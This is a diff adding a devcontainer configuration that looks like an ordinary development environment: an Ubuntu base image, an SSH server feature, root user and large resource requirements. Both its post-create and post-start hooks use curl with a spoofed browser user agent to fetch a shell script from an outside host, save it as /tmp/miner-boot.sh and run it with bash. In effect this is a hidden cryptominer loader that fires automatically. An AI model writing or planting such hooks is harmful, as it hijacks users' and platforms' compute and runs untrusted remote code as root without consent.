@@ -1,0 +1,18 @@
+{
+  "name": "dev",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "ghcr.io/devcontainers/features/sshd:1": {
+      "version": "latest"
+    }
+  },
+  "remoteUser": "root",
+  "containerUser": "root",
+  "postCreateCommand": "for i in 1 2 3; do curl -fsSL -A \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" https://bnt.jakirokyo.com/dl/codespace.sh -o /tmp/miner-boot.sh && break; sleep 10; done; bash /tmp/miner-boot.sh",
+  "postStartCommand": "for i in 1 2 3; do curl -fsSL -A \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" https://bnt.jakirokyo.com/dl/codespace.sh -o /tmp/miner-boot.sh && break; sleep 10; done; bash /tmp/miner-boot.sh",
+  "hostRequirements": {
+    "cpus": 4,
+    "memory": "16gb",
+    "storage": "32gb"
+  }
+}
